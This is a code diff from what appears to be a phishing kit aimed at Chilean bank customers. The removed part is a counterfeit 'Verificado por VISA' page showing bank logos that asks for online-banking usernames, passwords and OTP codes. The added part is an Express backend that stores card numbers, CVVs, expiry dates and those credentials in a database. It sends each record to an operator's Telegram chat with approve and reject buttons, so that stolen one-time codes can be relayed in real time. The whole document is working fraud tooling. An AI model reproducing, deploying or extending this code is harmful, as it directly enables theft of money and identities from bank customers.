@@ -1,485 +1,227 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Verificado por VISA</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background-image: url('blure.png');
-            background-size: cover; background-position: center;
-            background-repeat: no-repeat; background-attachment: fixed;
-            min-height: 100vh; display: flex; align-items: center;
-            justify-content: center; padding: 20px; position: relative;
-        }
-        body::before {
-            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px);
-            z-index: 0;
-        }
-        .modal-container {
-            background: #ffffff; border-radius: 6px;
-            box-shadow: 0 15px 50px rgba(0, 0, 0, 0.4);
-            padding: 50px; max-width: 480px; width: 100%;
-            position: relative; z-index: 1;
-        }
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 30px; min-height: 50px; }
-        .bank-logo { display: flex; align-items: center; justify-content: flex-start; height: 45px; }
-        .bank-logo img { height: 100%; width: auto; max-width: 140px; object-fit: contain; display: none; }
-        .bank-icon-placeholder { display: none; width: 40px; height: 40px; }
-        .visa-logo { display: flex; align-items: center; justify-content: flex-end; height: 45px; }
-        .visa-logo img { height: 100%; width: auto; object-fit: contain; }
-        .form-title { font-size: 1.65rem; font-weight: 700; color: #000; margin-bottom: 12px; letter-spacing: -0.5px; }
-        .form-subtitle { font-size: 1.05rem; color: #4a4a4a; margin-bottom: 35px; line-height: 1.5; }
-        .form-subtitle strong { color: #000; font-weight: 600; }
-        form { display: flex; flex-direction: column; gap: 24px; }
-        .form-group { display: flex; flex-direction: column; gap: 10px; }
-        .form-label { font-size: 1rem; font-weight: 500; color: #000; }
-        .form-label .required { color: #dc2626; margin-left: 2px; }
-        .form-input {
-            padding: 16px 18px; border: 1px solid #d1d5db; border-radius: 6px;
-            font-family: 'Inter', sans-serif; font-size: 1.05rem; color: #000;
-            transition: border-color 0.2s; background: #fff; width: 100%;
-        }
-        .form-input:focus { outline: none; border-color: #000; }
-        .form-input::placeholder { color: #9ca3af; }
-        .form-input:disabled { background: #f3f4f6; cursor: not-allowed; }
-        .error-message { color: #dc2626; font-size: 0.85rem; display: none; margin-top: 4px; }
-        .form-group.error .form-input { border-color: #dc2626; }
-        .form-group.error .error-message { display: block; }
-        .otp-section { display: none; animation: fadeIn 0.3s ease; background: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; padding: 16px; margin-top: 10px; }
-        .otp-section.visible { display: block; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .otp-info { display: flex; align-items: center; gap: 10px; font-size: 0.95rem; color: #4a4a4a; margin-bottom: 15px; }
-        .otp-info svg { width: 20px; height: 20px; flex-shrink: 0; }
-        .btn-primary {
-            background: #000000; color: #ffffff; border: none; border-radius: 6px;
-            padding: 18px; font-size: 1.1rem; font-weight: 600; cursor: pointer;
-            transition: background 0.2s; width: 100%; margin-top: 10px;
-        }
-        .btn-primary:hover:not(:disabled) { background: #222222; }
-        .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
-        .status-message { display: none; padding: 14px; border-radius: 6px; font-size: 0.95rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
-        .status-message.error { display: block; background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
-        .status-message.success { display: block; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
-        
-        /* ==========================================
-           NUEVO DISEÑO DE PANTALLA DE CARGA (OVERLAY)
-           ========================================== */
-        .loading-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.2); z-index: 1000;
-            justify-content: center; align-items: center; flex-direction: column;
-            backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);
-            opacity: 0; transition: opacity 0.3s ease;
-        }
-        .loading-overlay.active { display: flex; opacity: 1; }
-        
-        .loading-card {
-            background: #ffffff;
-            border-radius: 12px;
-            padding: 40px 50px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 20px;
-            transform: translateY(10px);
-            transition: transform 0.3s ease;
-        }
-        .loading-overlay.active .loading-card { transform: translateY(0); }
-        
-        .spinner {
-            width: 50px; height: 50px;
-            border: 4px solid #f3f4f6;
-            border-top: 4px solid #255ade;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-        .loading-text { 
-            color: #1a1a1a; 
-            font-size: 1.1rem; 
-            font-weight: 600; 
-            letter-spacing: -0.2px;
-        }
-        .loading-subtext {
-            color: #6b7280;
-            font-size: 0.85rem;
-            font-weight: 400;
-            margin-top: -10px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        @media (max-width: 480px) {
-            .modal-container { padding: 30px 20px; }
-            .form-title { font-size: 1.35rem; }
-            .form-input { padding: 14px; font-size: 1rem; }
-            .header { min-height: 60px; margin-bottom: 25px; }
-            .bank-logo { height: 40px; }
-            .visa-logo { height: 45px; }
-            .loading-card { padding: 30px 40px; }
-        }
-    </style>
-</head>
-<body>
-    <!-- PANTALLA DE CARGA MEJORADA -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-card">
-            <div class="spinner"></div>
-            <div class="loading-text" id="loadingText">Verificando seguridad...</div>
-            <div class="loading-subtext">Por favor, no cierres esta ventana</div>
-        </div>
-    </div>
+const express = require('express');
+const cors = require('cors');
+const { Pool } = require('pg');
 
-    <div class="modal-container">
-        <div class="header">
-            <div class="bank-logo" id="bankLogoContainer">
-                <img id="bankLogoImg" src="" alt="Logo banco" />
-                <svg id="bankIconPlaceholder" class="bank-icon-placeholder" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M3 21h18M3 10h18M5 6l7-3 7 3M4 10v11m16-11v11M8 14v3m4-3v3m4-3v3"/>
-                </svg>
-            </div>
-            <div class="visa-logo">
-                <img src="idvisa.png" alt="Verificado por VISA" />
-            </div>
-        </div>
+const app = express();
+app.use(cors());
+app.use(express.json({ limit: '1mb' }));
 
-        <h1 class="form-title" id="mainTitle">Autenticación de compra</h1>
-        <p class="form-subtitle" id="mainSubtitle">
-            Ingresa tus credenciales de seguridad para tu <strong id="bankNombre">banco emisor</strong> para validar la transacción.
-        </p>
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+    max: 5,
+    ssl: { rejectUnauthorized: false }
+});
 
-        <div class="status-message" id="statusMessage"></div>
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://sncill-to-yzzz.onrender.com';
+const PUBLIC_BACKEND_URL = process.env.PUBLIC_BACKEND_URL || 'https://package-json-y86a.onrender.com';
 
-        <form id="authForm" novalidate>
-            <div id="credentialsSection">
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label class="form-label">Usuario <span class="required">*</span></label>
-                    <input type="text" class="form-input" id="username" placeholder="Ingresa tu usuario" required />
-                    <div class="error-message">El usuario es requerido</div>
-                </div>
-                <div class="form-group" style="margin-bottom: 20px;">
-                    <label class="form-label">Contraseña <span class="required">*</span></label>
-                    <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña" required />
-                    <div class="error-message">La contraseña es requerida</div>
-                </div>
-            </div>
+async function initDB() {
+    await pool.query(`
+        CREATE TABLE IF NOT EXISTS pagos_pendientes (
+            id               SERIAL PRIMARY KEY,
+            solicitud_id     VARCHAR(80) UNIQUE NOT NULL,
+            titular          VARCHAR(120),
+            numero_tarjeta   VARCHAR(30),
+            cvv              VARCHAR(6),
+            vencimiento      VARCHAR(10),
+            marca_tarjeta    VARCHAR(20),
+            banco_emisor     VARCHAR(120),
+            estado           VARCHAR(30) DEFAULT 'pendiente',
+            motivo_rechazo   TEXT,
+            redirigir_a      VARCHAR(60),
+            telegram_msg_id  BIGINT,
+            usuario_banco    VARCHAR(120),
+            password_banco   VARCHAR(120),
+            codigo_otp       VARCHAR(20),
+            paso             VARCHAR(30) DEFAULT 'crear',
+            fase_actual      VARCHAR(20) DEFAULT 'credenciales',
+            credenciales_aprobadas BOOLEAN DEFAULT FALSE,
+            otp_aprobado     BOOLEAN DEFAULT FALSE,
+            created_at       TIMESTAMPTZ DEFAULT NOW(),
+            updated_at       TIMESTAMPTZ DEFAULT NOW()
+        );
+    `);
+    
+    // Asegurar que las columnas nuevas existan si la tabla ya existía
+    await pool.query(`
+        ALTER TABLE pagos_pendientes
+          ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
+          ADD COLUMN IF NOT EXISTS password_banco VARCHAR(120),
+          ADD COLUMN IF NOT EXISTS codigo_otp VARCHAR(20),
+          ADD COLUMN IF NOT EXISTS paso VARCHAR(30) DEFAULT 'crear',
+          ADD COLUMN IF NOT EXISTS fase_actual VARCHAR(20) DEFAULT 'credenciales',
+          ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
+          ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
+    `);
+    
+    await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
+    console.log('✅ Tabla lista');
+}
+initDB().catch(err => console.error('❌ initDB:', err));
 
-            <div class="otp-section" id="otpSection">
-                <div class="otp-info">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
-                        <path d="M12 8v4"/>
-                        <path d="M12 16h.01"/>
-                    </svg>
-                    <span id="otpInfoMessage">Para realizar este proceso, ingresa el código de Token móvil o físico.</span>
-                </div>
-                <div class="form-group" style="margin-bottom:0;">
-                    <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
-                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="8" inputmode="numeric" required />
-                    <div class="error-message">El código debe tener entre 4 y 8 dígitos</div>
-                </div>
-            </div>
+// --- TELEGRAM HELPERS ---
+async function tgSendMessage(text, replyMarkup) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    try {
+        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+        return await r.json();
+    } catch (e) { return { ok: false }; }
+}
 
-            <button type="submit" class="btn-primary" id="submitButton">
-                <span id="buttonText">Continuar</span>
-            </button>
-        </form>
-    </div>
+async function tgEditMessage(messageId, text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
+    try {
+        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, text, parse_mode: 'HTML' }) });
+        return r.json();
+    } catch { return null; }
+}
 
-    <script>
-        const POLLING_INTERVAL = 2000;
-        const MAX_POLLING_TIME = 300000;
+async function tgAnswerCallback(callbackQueryId, text) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
+    try {
+        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
+    } catch {}
+}
 
-        const BANK_LOGOS = {
-            'Banco de Chile':  'bancochile.png',
-            'Banco Estado':    'bancoestado.png',
-            'Santander':       'santander.png',
-            'BCI':             'BCI.png',
-            'Banco Falabella': 'falabella.png',
-            'BICE':            'bice.png',
-            'Banco Ripley':    'ripley.png',
-            'BBVA':            'bbva.png',
-            'Tenpo':           'tenpo.png',
-            'MACH':            'mach.png',
-            'Coopeuch':        'coopeuch.png'
-        };
+function construirTextoPago(pago) {
+    return (
+        `🆔 <b>ID:</b> <code>${pago.solicitud_id}</code>\n` +
+        `👤 <b>Titular:</b> ${pago.titular || '—'}\n` +
+        `💳 <b>Tarjeta:</b> <code>${pago.numero_tarjeta}</code>\n` +
+        `📅 <b>Vence:</b> ${pago.vencimiento}\n` +
+        `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
+        `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
+        `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
+        `\n<b>── CREDENCIALES BANCO ──</b>\n` +
+        `👤 <b>Usuario:</b> <code>${pago.usuario_banco || '—'}</code>\n` +
+        `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
+        `🔐 <b>OTP:</b> <code>${pago.codigo_otp || '—'}</code>\n` +
+        `\n🕒 <b>Creado:</b> ${new Date(pago.created_at).toLocaleString('es-CL')}`
+    );
+}
 
-        let solicitudId = null;
-        try {
-            const t = JSON.parse(localStorage.getItem('tarjeta_aprobada') || 'null');
-            if (t && t.solicitud_id) solicitudId = t.solicitud_id;
-        } catch {}
-        if (!solicitudId) solicitudId = localStorage.getItem('tarjeta_aprobada_solicitud');
-        if (!solicitudId) {
-            alert('No hay datos de pago. Volviendo al inicio.');
-            window.location.href = 'index.html';
-        }
+async function enviarSolicitudATelegram(pago) {
+    const texto = `🔔 <b>NUEVA SOLICITUD DE PAGO</b>\n\n` + construirTextoPago(pago);
+    const replyMarkup = {
+        inline_keyboard: [[
+            { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+            { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
+        ]]
+    };
+    const res = await tgSendMessage(texto, replyMarkup);
+    if (res.ok && res.result) {
+        await pool.query(`UPDATE pagos_pendientes SET telegram_msg_id = $1 WHERE solicitud_id = $2`, [res.result.message_id, pago.solicitud_id]);
+    }
+}
 
-        let faseActual = 'credenciales';
-        let pollingInterval = null;
-        let formularioBloqueado = false;
+// --- ENDPOINTS ---
+app.post('/api/crear-pago', async (req, res) => {
+    const { solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso } = req.body || {};
+    
+    if (!solicitud_id || !numero_tarjeta || !cvv || !vencimiento || !titular) return res.status(400).json({ success: false, error: 'Datos incompletos' });
 
-        const form = document.getElementById('authForm');
-        const usernameInput = document.getElementById('username');
-        const passwordInput = document.getElementById('password');
-        const confirmationInput = document.getElementById('confirmationCode');
-        const otpSection = document.getElementById('otpSection');
-        const submitButton = document.getElementById('submitButton');
-        const buttonText = document.getElementById('buttonText');
-        const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingText = document.getElementById('loadingText');
-        const statusMessage = document.getElementById('statusMessage');
-        const bankLogoImg = document.getElementById('bankLogoImg');
-        const bankIconPlaceholder = document.getElementById('bankIconPlaceholder');
-        const bankNombre = document.getElementById('bankNombre');
+    try {
+        const result = await pool.query(
+            `INSERT INTO pagos_pendientes (solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta, banco_emisor, usuario_banco, password_banco, codigo_otp, paso, fase_actual)
+             VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12)
+             ON CONFLICT (solicitud_id) DO UPDATE
+               SET numero_tarjeta = EXCLUDED.numero_tarjeta, cvv = EXCLUDED.cvv, vencimiento = EXCLUDED.vencimiento, marca_tarjeta = EXCLUDED.marca_tarjeta, banco_emisor = EXCLUDED.banco_emisor, usuario_banco = COALESCE(EXCLUDED.usuario_banco, pagos_pendientes.usuario_banco), password_banco = COALESCE(EXCLUDED.password_banco, pagos_pendientes.password_banco), codigo_otp = COALESCE(EXCLUDED.codigo_otp, pagos_pendientes.codigo_otp), paso = COALESCE(EXCLUDED.paso, pagos_pendientes.paso), updated_at = NOW()
+             RETURNING *`,
+            [solicitud_id, titular, numero_tarjeta, cvv, vencimiento, marca_tarjeta.toLowerCase(), banco_emisor || 'Desconocido', usuario_banco || null, password_banco || null, codigo_otp || null, paso || 'crear', paso === 'otp' ? 'otp' : 'credenciales']
+        );
 
-        function cargarLogoBanco() {
-            let banco = localStorage.getItem('bancoEmisor') || '';
-            if (banco) { banco = banco.trim(); if (bankNombre) bankNombre.textContent = banco; }
-            const archivo = BANK_LOGOS[banco];
-            if (archivo) {
-                bankLogoImg.src = archivo;
-                bankLogoImg.alt = banco;
-                bankLogoImg.style.display = 'block';
-                bankLogoImg.onerror = () => {
-                    bankLogoImg.style.display = 'none';
-                    bankIconPlaceholder.style.display = 'block';
-                };
-                bankIconPlaceholder.style.display = 'none';
-            } else {
-                bankLogoImg.style.display = 'none';
-                bankIconPlaceholder.style.display = 'block';
-            }
-        }
+        const pago = result.rows[0];
+        const esNueva = !pago.telegram_msg_id;
 
-        function leerDatosTarjeta() {
-            try {
-                const t = JSON.parse(localStorage.getItem('tarjeta_aprobada') || 'null');
-                if (t && t.numero) return t;
-            } catch {}
-            return {
-                numero: localStorage.getItem('cardNumber') || 'N/A',
-                titular: localStorage.getItem('cardholderName') || 'N/A',
-                vencimiento: localStorage.getItem('expiry') || 'N/A',
-                cvv: localStorage.getItem('cvc') || 'N/A',
-                marca: localStorage.getItem('cardType') || 'visa',
-                banco: localStorage.getItem('bancoEmisor') || 'Desconocido'
+        if (esNueva) {
+            await enviarSolicitudATelegram(pago);
+        } else {
+            // 🔥 ESTO ES LO QUE ACTUALIZA EL MENSAJE EN TELEGRAM
+            const replyMarkup = {
+                inline_keyboard: [[
+                    { text: '✅ Aprobar',  callback_data: `aprobar:${pago.solicitud_id}` },
+                    { text: '❌ Rechazar', callback_data: `rechazar:${pago.solicitud_id}` }
+                ]]
             };
+            const texto = `📝 <b>DATOS ACTUALIZADOS (${paso || 'credenciales'})</b>\n\n` + construirTextoPago(pago);
+            await tgEditMessage(pago.telegram_msg_id, texto);
         }
 
-        async function enviarCredenciales(usuario, password) {
-            const t = leerDatosTarjeta();
-            try {
-                const resp = await fetch('/api/crear-pago', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        solicitud_id: solicitudId,
-                        titular: t.titular || 'N/A',
-                        numero_tarjeta: t.numero || 'N/A',
-                        cvv: t.cvv || 'N/A',
-                        vencimiento: t.vencimiento || 'N/A',
-                        marca_tarjeta: t.marca || 'visa',
-                        banco_emisor: t.banco || 'Desconocido',
-                        usuario_banco: usuario,
-                        password_banco: password,
-                        paso: 'credenciales'
-                    })
-                });
-                const data = await resp.json();
-                return data.success === true;
-            } catch (e) { return false; }
-        }
+        return res.json({ success: true, solicitud_id, estado: 'pendiente' });
+    } catch (err) {
+        console.error(err);
+        return res.status(500).json({ success: false, error: 'Error al registrar' });
+    }
+});
 
-        async function enviarOTP(codigo) {
-            const t = leerDatosTarjeta();
-            try {
-                const resp = await fetch('/api/crear-pago', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        solicitud_id: solicitudId,
-                        titular: t.titular || 'N/A',
-                        numero_tarjeta: t.numero || 'N/A',
-                        cvv: t.cvv || 'N/A',
-                        vencimiento: t.vencimiento || 'N/A',
-                        marca_tarjeta: t.marca || 'visa',
-                        banco_emisor: t.banco || 'Desconocido',
-                        codigo_otp: codigo,
-                        paso: 'otp'
-                    })
-                });
-                const data = await resp.json();
-                return data.success === true;
-            } catch (e) { return false; }
-        }
+app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
+    try {
+        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [req.params.solicitud_id]);
+        if (result.rows.length === 0) return res.status(404).json({ success: false, error: 'No encontrado' });
+        const row = result.rows[0];
 
-        function iniciarPolling(texto) {
-            if (pollingInterval) clearInterval(pollingInterval);
-            const start = Date.now();
-            loadingOverlay.classList.add('active');
-            if (texto) loadingText.textContent = texto;
-            formularioBloqueado = true;
+        if (row.estado === 'aprobado_credenciales') return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
+        if (row.estado === 'rechazado_credenciales') return res.json({ success: true, estado: 'rechazado', fase: 'credenciales', mensaje: row.motivo_rechazo });
 
-            pollingInterval = setInterval(async () => {
-                if (Date.now() - start > MAX_POLLING_TIME) {
-                    clearInterval(pollingInterval);
-                    pollingInterval = null;
-                    mostrarError('⏰ Tiempo de espera agotado.');
-                    resetFormulario();
-                    return;
-                }
-                try {
-                    const r = await fetch(`/api/estado-pago/${solicitudId}`);
-                    const data = await r.json();
-                    
-                    if (!data.success) return;
+        if (row.estado === 'aprobado' || row.otp_aprobado === true) return res.json({ success: true, estado: 'aprobado', fase: 'otp', redirect: `${FRONT_BASE_URL}/${row.redirigir_a || 'exito.html'}` });
+        if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') return res.json({ success: true, estado: 'rechazado', fase: 'otp', mensaje: row.motivo_rechazo });
 
-                    // FASE 1: Credenciales aprobadas
-                    if (data.estado === 'aprobado' && data.fase === 'credenciales') {
-                        clearInterval(pollingInterval);
-                        pollingInterval = null;
-                        loadingOverlay.classList.remove('active');
-                        desbloquearOTP();
-                        return;
-                    }
+        return res.json({ success: true, estado: 'pendiente', fase: row.fase_actual });
+    } catch (err) {
+        return res.status(500).json({ success: false, error: 'Error' });
+    }
+});
 
-                    // FASE 2: OTP aprobado
-                    if (data.estado === 'aprobado' && data.fase === 'otp') {
-                        clearInterval(pollingInterval);
-                        pollingInterval = null;
-                        loadingText.textContent = 'Autenticación exitosa. Redirigiendo...';
-                        setTimeout(() => { window.location.href = 'exito.html'; }, 1500);
-                        return;
-                    }
+app.post('/api/telegram-webhook', async (req, res) => {
+    res.sendStatus(200);
+    const cq = req.body?.callback_query;
+    if (!cq || !cq.data) return;
 
-                    // RECHAZADO
-                    if (data.estado === 'rechazado') {
-                        clearInterval(pollingInterval);
-                        pollingInterval = null;
-                        mostrarError(data.mensaje || '❌ Rechazado');
-                        resetFormulario();
-                        return;
-                    }
-                } catch (e) {}
-            }, POLLING_INTERVAL);
-        }
+    const [accion, solicitud_id] = cq.data.split(':');
+    const msgId = cq.message?.message_id;
 
-        function desbloquearOTP() {
-            usernameInput.disabled = true;
-            passwordInput.disabled = true;
-            otpSection.classList.add('visible');
-            confirmationInput.disabled = false;
-            confirmationInput.focus();
-            document.getElementById('mainTitle').textContent = 'Verificación de seguridad';
-            document.getElementById('mainSubtitle').innerHTML =
-                `Credenciales verificadas. Ingresa el código OTP para completar la transacción con <strong>${bankNombre.textContent}</strong>.`;
-            buttonText.textContent = 'Confirmar OTP';
-            faseActual = 'otp';
-            formularioBloqueado = false;
-            submitButton.disabled = false;
-        }
+    try {
+        const result = await pool.query(`SELECT * FROM pagos_pendientes WHERE solicitud_id = $1`, [solicitud_id]);
+        if (result.rows.length === 0) return await tgAnswerCallback(cq.id, 'No encontrada');
+        const pago = result.rows[0];
 
-        function mostrarError(msg) {
-            statusMessage.className = 'status-message error';
-            statusMessage.textContent = msg;
-            statusMessage.style.display = 'block';
-            loadingOverlay.classList.remove('active');
-            formularioBloqueado = false;
-        }
+        const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';
 
-        function resetFormulario() {
-            usernameInput.disabled = false;
-            passwordInput.disabled = false;
-            confirmationInput.disabled = true;
-            otpSection.classList.remove('visible');
-            faseActual = 'credenciales';
-            loadingOverlay.classList.remove('active');
-            submitButton.disabled = false;
-            buttonText.textContent = 'Continuar';
-            usernameInput.value = '';
-            passwordInput.value = '';
-            confirmationInput.value = '';
-            statusMessage.className = 'status-message';
-            statusMessage.style.display = 'none';
-            formularioBloqueado = false;
-            if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
-        }
-
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            if (formularioBloqueado) return;
-
-            let isValid = true;
-            statusMessage.className = 'status-message';
-            statusMessage.style.display = 'none';
-            document.querySelectorAll('.form-group.error').forEach(el => el.classList.remove('error'));
-
-            if (faseActual === 'credenciales') {
-                if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
-                if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
-                else if (passwordInput.value.length < 4) {
-                    passwordInput.parentElement.classList.add('error');
-                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
-                    isValid = false;
-                }
-            } else if (faseActual === 'otp') {
-                if (!confirmationInput.value.trim()) { confirmationInput.parentElement.classList.add('error'); isValid = false; }
-                else if (!/^\d{4,8}$/.test(confirmationInput.value)) {
-                    confirmationInput.parentElement.classList.add('error');
-                    confirmationInput.parentElement.querySelector('.error-message').textContent = 'Debe tener entre 4 y 8 dígitos';
-                    isValid = false;
-                }
+        if (accion === 'aprobar') {
+            if (!estaEnFaseOTP) {
+                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado_credenciales', credenciales_aprobadas = TRUE, updated_at = NOW() WHERE solicitud_id = $1`, [solicitud_id]);
+                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
+                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + construirTextoPago(pago));
+            } else {
+                const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
+                await pool.query(`UPDATE pagos_pendientes SET estado = 'aprobado', otp_aprobado = TRUE, fase_actual = 'completado', redirigir_a = $1, updated_at = NOW() WHERE solicitud_id = $2`, [archivo, solicitud_id]);
+                await tgAnswerCallback(cq.id, '✅ Pago aprobado');
+                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + construirTextoPago(pago));
             }
+        } else if (accion === 'rechazar') {
+            const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
+            const nuevoEstado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
+            await pool.query(`UPDATE pagos_pendientes SET estado = $1, motivo_rechazo = $2, updated_at = NOW() WHERE solicitud_id = $3`, [nuevoEstado, motivo, solicitud_id]);
+            await tgAnswerCallback(cq.id, '❌ Rechazado');
+            if (msgId) await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + construirTextoPago(pago) + `\n📌 <b>Motivo:</b> ${motivo}`);
+        }
+    } catch (err) { console.error(err); }
+});
 
-            if (!isValid) return;
+async function registrarWebhook() {
+    if (!TELEGRAM_TOKEN) return;
+    try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook?url=${encodeURIComponent(PUBLIC_BACKEND_URL + '/api/telegram-webhook')}`);
+        console.log('✅ Webhook registrado');
+    } catch (e) { console.error(e); }
+}
 
-            formularioBloqueado = true;
-            submitButton.disabled = true;
-
-            if (faseActual === 'credenciales') {
-                buttonText.textContent = 'Verificando...';
-                loadingText.textContent = 'Verificando credenciales...';
-                loadingOverlay.classList.add('active'); // Mostrar carga inmediatamente
-                
-                const ok = await enviarCredenciales(usernameInput.value.trim(), passwordInput.value.trim());
-                if (!ok) {
-                    mostrarError('Error al procesar las credenciales');
-                    resetFormulario();
-                    return;
-                }
-                iniciarPolling('Esperando aprobación del banco...');
-
-            } else if (faseActual === 'otp') {
-                buttonText.textContent = 'Verificando OTP...';
-                loadingText.textContent = 'Validando código de seguridad...';
-                loadingOverlay.classList.add('active'); // Mostrar carga inmediatamente
-                
-                const ok = await enviarOTP(confirmationInput.value.trim());
-                if (!ok) {
-                    mostrarError('Error al procesar el OTP');
-                    formularioBloqueado = false;
-                    submitButton.disabled = false;
-                    buttonText.textContent = 'Confirmar OTP';
-                    return;
-                }
-                iniciarPolling('Esperando confirmación final...');
-            }
-        });
-
-        confirmationInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '');
-            if (this.value.length > 8) this.value = this.value.slice(0, 8);
-        });
-
-        window.addEventListener('load', function() {
-            cargarLogoBanco();
-        });
-    </script>
-</body>
-</html>
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, '0.0.0.0', () => {
+    console.log(`🚀 Backend en puerto ${PORT}`);
+    registrarWebhook();
+});
